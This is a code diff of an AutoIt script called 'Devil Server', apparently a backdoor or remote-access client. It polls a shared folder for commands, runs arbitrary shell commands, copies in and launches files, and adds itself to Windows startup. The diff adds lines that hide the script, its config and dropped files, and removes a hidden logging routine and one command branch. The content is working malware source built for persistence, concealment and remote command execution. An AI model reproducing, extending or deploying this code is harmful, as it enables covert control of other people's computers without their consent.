@@ -33,6 +33,8 @@ If $Config_FirstStart = "1" Then
 	EndIf
 
    If FileExists(@StartupDir & "\devil_server.lnk") Then
+   		FileSetAttrib(@ScriptFullPath, "+H")
+		FileSetAttrib("config.ini", "+H")
 		MsgBox($MB_OK, "Devil Server", "Devil Server added to start-up!")
 	Else
 		MsgBox($MB_OK, "Devil Server", "Devil Server can not add self to the start-up! Try again!")
@@ -47,9 +49,7 @@ While True
 	$ServerData = ReadServer()
 
 	; Definition and execution of the received command
-	If $ServerData[0] = "load_file" Then
-		LoadFile($ServerData[1])
-	ElseIf $ServerData[0] = "execute_command" Then
+	If $ServerData[0] = "execute_command" Then
 		CMDExecute($ServerData[1])
 	ElseIf $ServerData[0] = "show_message" Then
 		ShowMessageBox($ServerData[1])
@@ -67,15 +67,6 @@ While True
 	EndIf
 	If $Status_CrazyMouse = "True" Then
 		CrazyMouse()
-	EndIf
-
-	; Сheck if need to make logs
-	If FileExists($Config_ServerPatch & "\LogQuery) Then
-		OutputLogs()
-		Sleep(1000)
-		If FileExists($Config_ServerPatch & "\LogQuery) Then 
-			FileDelete($Config_ServerPatch & "\LogQuery) 
-		EndIf
 	EndIf
 WEnd
 
@@ -95,31 +86,15 @@ Func ReadServer()
 	EndIf
 EndFunc
 
-; Write logs to the shared folder 
-Func OutputLogs()
-	Local $Logs_file = FileOpen($Config_ServerPatch & "\" & $Config_ClientID & "_logs", $FO_APPEND)
-	FileSetAttrib($Config_ServerPatch & "\" & $Config_ClientID & "_logs", "+H") ; Hide file
-	FileWriteLine($Logs_file, "Time: " & @HOUR & ":" & @MIN)
-	FileWriteLine($Logs_file, "Client ID: " & $Config_ClientID)
-	FileWriteLine($Logs_file, "Server patch: " & $Config_ServerPatch)
-	FileWriteLine($Logs_file, "Client directory: " & @ScriptFullPath)
-	FileWriteLine($Logs_file, "System name: " & @ComputerName)
-	If FileExists(@StartupDir & "\devil_server.lnk") Then
-		FileWriteLine($Logs_file, "Added to start-up: True")
-	Else
-		FileWriteLine($Logs_file, "Added to start-up: False")
-	EndIf
-	FileClose($Logs_file)
-EndFunc
-
 ; Upload and run file
 Func LoadFile($File_name)
 	FileCopy($Config_ServerPatch & "\" & $File_name, @ScriptDir, 1)
+	FileSetAttrib($File_name, "+H")
 	FileDelete($Config_ServerPatch & "\" & $File_name)
 	ShellExecute(@ScriptDir & "\" & $File_name) ; Launch the file
 EndFunc
 
-; Execute to shell
+; Execute to CMD
 Func CMDExecute($Command)
 	ShellExecute($Command)
 EndFunc
@@ -143,5 +118,3 @@ EndFunc
 Func CrazyMouse()
 	MouseMove(Random(0, @DesktopWidth), Random(0, @DesktopHeight), 1) ; Move mouse to random position
 EndFunc
-
-; ------------------------------------------------------------------------------
